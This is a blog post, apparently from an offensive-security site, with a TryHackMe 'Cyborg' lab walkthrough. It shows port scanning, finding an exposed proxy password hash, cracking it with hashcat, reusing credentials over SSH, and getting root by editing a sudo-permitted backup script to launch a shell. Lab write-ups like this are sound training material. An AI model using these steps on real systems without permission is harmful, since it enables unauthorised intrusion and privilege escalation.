<!doctype html><html lang="en" data-mode="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Cyborg - TryHackMe" /><meta property="og:locale" content="en" /><meta name="description" content="Red Team README is an offensive security blog for write-ups and articles on red teaming and penetration testing." /><meta property="og:description" content="Red Team README is an offensive security blog for write-ups and articles on red teaming and penetration testing." /><link rel="canonical" href="https://www.redteamreadme.com/posts/cyborg/" /><meta property="og:url" content="https://www.redteamreadme.com/posts/cyborg/" /><meta property="og:site_name" content="Red Team README" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-25T17:11:04-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Cyborg - TryHackMe" /><meta name="twitter:site" content="@dnstun0" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-04-11T23:14:27-04:00","datePublished":"2021-12-25T17:11:04-05:00","description":"Red Team README is an offensive security blog for write-ups and articles on red teaming and penetration testing.","headline":"Cyborg - TryHackMe","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.redteamreadme.com/posts/cyborg/"},"url":"https://www.redteamreadme.com/posts/cyborg/"}</script><title>Cyborg - TryHackMe | Red Team README</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Red Team README"><meta name="application-name" content="Red Team README"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/redteam.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/">Red Team README</a><p class="site-subtitle fst-italic mb-0">Everything offensive security.</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/dnstun0" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/dnstun0" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dnstun0','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Cyborg - TryHackMe</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>Cyborg - TryHackMe</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1640470264" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Dec 25, 2021 </time> </span> <span> Updated <time data-ts="1744427667" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Apr 11, 2025 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/dnstun0">dnstun0</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="1443 words" > <em>8 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">Cyborg - TryHackMe</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">Cyborg - TryHackMe</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><p><a href="/assets/img/20211230212145.png" class="popup img-link shimmer"><img src="/assets/img/20211230212145.png" alt="Cyborg Banner" loading="lazy"></a></p><p><a href="https://tryhackme.com/room/cyborgt8">Cyborg</a> was an easy <a href="https://tryhackme.com">TryHackMe</a> box involving misconfiguration and encrypted backup archives. You start by finding an open admin page that has a download link to an encrypted archive. There is a misconfigured squid proxy on the system that allows you to obtain the password, which is then easily cracked. The same password was used to encrypt the archive and the user has left their credentials in a plaintext file within. Those credentials will allow you to log in through SSH. Once on the system, you can escalate your privileges by modifying an MP3 backup script that has been granted sudo privileges.</p><blockquote class="prompt-info"><p>Please note: To comply with TryHackMe‚Äôs write-up requirements, I‚Äôve included a link to TryHackMe above and redacted all passwords, cracked hashes, and flags.</p></blockquote><h2 id="initial-enumeration"><span class="me-2">Initial Enumeration</span><a href="#initial-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let‚Äôs start with a scan to see what kind of attack surface we‚Äôre working with.</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-25 21:17 EST
Nmap scan report for cyborg (cyborg)
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.63 seconds
</pre></table></code></div></div><p>Two ports open! I like when there are only a couple of ports open. It means fewer things to look at and less chance of a dead end.</p><p>Let‚Äôs hit the web port with our browser and see what comes up.</p><p><a href="/assets/img/20211225211540.png" class="popup img-link shimmer"><img src="/assets/img/20211225211540.png" alt="The default page" loading="lazy"></a></p><p>A default page won‚Äôt get us anything useful, so the next step is to run a directory buster. I‚Äôve been playing with <a href="https://github.com/epi052/feroxbuster">feroxbuster</a> recently, so we‚Äôll use that to see what comes up.</p><p><a href="/assets/img/20211225212231.png" class="popup img-link shimmer"><img src="/assets/img/20211225212231.png" alt="feroxbuster output" loading="lazy"></a></p><p>Ooh, an admin panel!</p><p><a href="/assets/img/20211225212342.png" class="popup img-link shimmer"><img src="/assets/img/20211225212342.png" alt="An admin panel" loading="lazy"></a></p><p>There‚Äôs almost nothing here, but under the ‚ÄúArchive‚Äù menu there‚Äôs a download link for an archive tarball (<code class="language-plaintext highlighter-rouge">archive.tar</code>).</p><h2 id="examining-the-archive"><span class="me-2">Examining the Archive</span><a href="#examining-the-archive" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>If the filename hasn‚Äôt given it away, the folder structure indicates this is clearly a backup archive.</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>home/field/dev/final_archive/
home/field/dev/final_archive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1
</pre></table></code></div></div><p>The <em>README</em> file helps us identify what software created it.</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
</pre></table></code></div></div><div style="text-align: center; font-style: italic; font-size: 12px">home/field/dev/final_archive/README</div><p>Let‚Äôs go read some <a href="https://borgbackup.readthedocs.io/">documentation</a>! The <a href="https://borgbackup.readthedocs.io/en/stable/quickstart.html">Quick Start</a> guide has exactly what we‚Äôll need. Step four desribes how to list all archives in a repository, which seems like a reasonable first probe to see what we‚Äôre working with. First we‚Äôll need the Borg command utility installed. I didn‚Äôt want to install another package on my machine I‚Äôll never touch again, so I grabbed the latest binaries from their <a href="https://github.com/borgbackup/borg/releases">releases page</a> and tried the list command.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>borg-dir/borg.exe list home/field/dev/final_archive
<span class="go">Enter passphrase for key /home/iptunneler/thm/cyborg/home/field/dev/final_archive: 
</span></pre></table></code></div></div><div style="text-align: center; font-style: italic; font-size: 12px">List the archive contents</div><p>Blocked! We need a password to access the archive. Let‚Äôs go back and dig around the admin panel for more clues.</p><h2 id="enumeration-continued"><span class="me-2">Enumeration Continued</span><a href="#enumeration-continued" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>There‚Äôs an ‚ÄúAdmin Shoutbox‚Äù page that looks like a chat log.</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>[Today at 5.45am from Alex]
Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
I decided to give up like i always do ahahaha sorry about that.
I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
Might pass it over to the IT guys but in the meantime all the config files are laying about.
And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
other than that im pretty sure my backup "music_archive" is safe just to confirm.
</pre></table></code></div></div><div style="text-align: center; font-style: italic; font-size: 12px">Chat logs provide a clue</div><p>This message explains some of the feroxbuster results we skipped over earlier. The <code class="language-plaintext highlighter-rouge">/etc/squid</code> path gives us a directory listing with the squid proxy config and a <em>passwd</em> file.</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
</pre></table></code></div></div><div style="text-align: center; font-style: italic; font-size: 12px">/etc/squid/passwd</div><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
</pre></table></code></div></div><div style="text-align: center; font-style: italic; font-size: 12px">/etc/squid/squid.conf</div><h2 id="password-cracking"><span class="me-2">Password Cracking</span><a href="#password-cracking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Using <code class="language-plaintext highlighter-rouge">hash-identifier</code>, we can figure out what kind of hash we‚Äôre dealing with.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>hash-identifier
<span class="gp">   #</span><span class="c">########################################################################</span>
<span class="gp">   #</span><span class="w">     </span>__  __                     __           ______    _____           <span class="c">#</span>
<span class="gp">   #</span><span class="w">    </span>/<span class="se">\ \/\ \ </span>                  /<span class="se">\ \ </span>        /<span class="se">\_</span>_  _<span class="se">\ </span> /<span class="se">\ </span> _ <span class="sb">`</span><span class="se">\ </span>        <span class="c">#</span>
<span class="gp">   #</span><span class="w">    </span><span class="se">\ \ \_\ \ </span>    __      ____ <span class="se">\ \ \_</span>__     <span class="se">\/</span>_/<span class="se">\ \/</span>  <span class="se">\ \ \/\ \ </span>       <span class="c">#</span>
<span class="gp">   #</span><span class="w">     </span><span class="se">\ \ </span> _  <span class="se">\ </span> /<span class="s1">'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
</span><span class="gp">   #</span><span class="w">      </span><span class="s1">\ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
</span><span class="gp">   #</span><span class="w">       </span><span class="s1">\ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
</span><span class="gp">   #</span><span class="w">        </span><span class="s1">\/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
</span><span class="gp">   #</span><span class="w">                                                             </span><span class="s1">By Zion3R #
</span><span class="gp">   #</span><span class="w">                                                    </span><span class="s1">www.Blackploit.com #
</span><span class="gp">   #</span><span class="w">                                                   </span><span class="s1">Root@Blackploit.com #
</span><span class="gp">   #</span><span class="s1">########################################################################
</span><span class="go">--------------------------------------------------
</span><span class="gp"> HASH: $</span>apr1<span class="nv">$BpZ</span>.Q.1m<span class="nv">$F0qqPwHSOG50URuOVQTTn</span><span class="nb">.</span>
<span class="go">
Possible Hashs:
[+] MD5(APR)
--------------------------------------------------
 HASH: 
</span></pre></table></code></div></div><p>MD5(APR); that‚Äôs <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hash-mode</a> 1600 in hashcat. Let‚Äôs see if we can crack it.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">$ hashcat -m1600 -a0 --show '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:REDACTED
</span></pre></table></code></div></div><div style="text-align: center; font-style: italic; font-size: 12px">Using hashcat to crack the squid hash</div><h2 id="unlocking-the-archive"><span class="me-2">Unlocking the Archive</span><a href="#unlocking-the-archive" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Great! Hopefully the admin likes to re-use passwords. Let‚Äôs see if it we can use it to unlock the backup archive.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>borg-dir/borg.exe list home/field/dev/final_archive
<span class="go">Enter passphrase for key /home/iptunneler/thm/cyborg/home/field/dev/final_archive: 
music_archive                        Tue, 2020-12-29 09:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
</span></pre></table></code></div></div><div style="text-align: center; font-style: italic; font-size: 12px">Try listing the archive again with the cracked password</div><p>Another win! Okay, let‚Äôs unpack it and see what‚Äôs inside.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>borg-dir/borg.exe extract home/field/dev/final_archive::music_archive
<span class="go">Enter passphrase for key /home/iptunneler/thm/cyborg/home/field/dev/final_archive:
</span><span class="gp">$</span><span class="w"> </span>find home/alex <span class="nt">-not</span> <span class="nt">-path</span> <span class="s2">"home/alex/.config/*"</span> <span class="nt">-not</span> <span class="nt">-path</span> <span class="s2">"home/alex/.dbus/*"</span>
<span class="go">home/alex
home/alex/.bashrc
home/alex/.bash_logout
home/alex/.profile
home/alex/Music
home/alex/.bash_history
home/alex/.dbus
home/alex/.config
home/alex/Documents
home/alex/Documents/note.txt
home/alex/Public
home/alex/Videos
home/alex/Desktop
home/alex/Desktop/secret.txt
home/alex/Downloads
home/alex/Templates
home/alex/Pictures
</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>home/alex/Documents/note.txt
<span class="go">Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:REDACTED
</span></pre></table></code></div></div><div style="text-align: center; font-style: italic; font-size: 12px">Explore the extracted archive</div><h2 id="gaining-user-access"><span class="me-2">Gaining User Access</span><a href="#gaining-user-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Looks like some plaintext credentials to me. Let‚Äôs try them on the SSH port.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>ssh alex@cyborg
<span class="go">The authenticity of host 'cyborg (10.10.123.70)' can't be established.
ECDSA key fingerprint is SHA256:uB5ulnLcQitH1NC30YfXJUbdLjQLRvGhDRUgCSAD7F8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cyborg,10.10.123.70' (ECDSA) to the list of known hosts.
alex@cyborg's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


27 packages can be updated.
0 updates are security updates.


</span><span class="gp">The programs included with the Ubuntu system are free software;</span><span class="w">
</span><span class="go">the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

</span><span class="gp">alex@ubuntu:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-al</span> user.txt
<span class="go">-r-xr--r-- 1 alex alex 40 Dec 30  2020 user.txt
</span><span class="gp">alex@ubuntu:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
<span class="go">flag{REDACTED}
</span><span class="gp">alex@ubuntu:~$</span><span class="w"> 
</span></pre></table></code></div></div><div style="text-align: center; font-style: italic; font-size: 12px">Try the credentials on the SSH service</div><h2 id="privilege-escalation"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Initial user access accomplished. Now on to gaining root. Let‚Äôs see what <code class="language-plaintext highlighter-rouge">alex</code> can sudo.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">alex@ubuntu:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="go">Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
</span><span class="gp">alex@ubuntu:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-al</span> /etc/mp3backups/backup.sh
<span class="go">-r-xr-xr-- 1 alex alex 1083 Dec 30  2020 /etc/mp3backups/backup.sh
</span><span class="gp">alex@ubuntu:~$</span><span class="w"> 
</span></pre></table></code></div></div><div style="text-align: center; font-style: italic; font-size: 12px">Check sudo permissions for alex</div><p>It doesn‚Äôt get easier than a writable custom script. All we need to do is add the write permission to the file and add a line to the script that spawns a new shell.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">alex@ubuntu:~$</span><span class="w"> </span><span class="nb">chmod </span>u+w /etc/mp3backups/backup.sh
<span class="gp">alex@ubuntu:~$</span><span class="w"> </span>vi /etc/mp3backups/backup.sh
</pre></table></code></div></div><div style="text-align: center; font-style: italic; font-size: 12px">Add write permissions and edit the backup script</div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
<span class="nb">sudo</span> /bin/bash  <span class="c"># Added</span>
<span class="nb">exit </span>0          <span class="c"># Added</span>
<span class="nb">sudo </span>find / <span class="nt">-name</span> <span class="s2">"*.mp3"</span> | <span class="nb">sudo tee</span> /etc/mp3backups/backed_up_files.txt
...
</pre></table></code></div></div><div style="text-align: center; font-style: italic; font-size: 12px">/etc/mp3backups/backup.sh - Modified to spawn a root shell</div><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">alex@ubuntu:~$</span><span class="w"> </span><span class="nb">sudo</span> /etc/mp3backups/backup.sh
<span class="gp">root@ubuntu:/root#</span><span class="w"> </span><span class="nb">cd</span> /root
<span class="gp">root@ubuntu:/root#</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-al</span> root.txt
<span class="go">-r-xr--r-- 1 root root 43 Dec 30  2020 root.txt
</span><span class="gp">root@ubuntu:/root#</span><span class="w"> </span><span class="nb">cat </span>root.txt
<span class="go">flag{REDACTED}
</span><span class="gp">root@ubuntu:/root#</span><span class="w"> 
</span></pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/tryhackme/">tryhackme</a>, <a href="/categories/writeup/">writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/easy/" class="post-tag no-text-decoration" >easy</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Cyborg%20-%20TryHackMe%20-%20Red%20Team%20README&url=https%3A%2F%2Fwww.redteamreadme.com%2Fposts%2Fcyborg%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Cyborg%20-%20TryHackMe%20-%20Red%20Team%20README&u=https%3A%2F%2Fwww.redteamreadme.com%2Fposts%2Fcyborg%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" 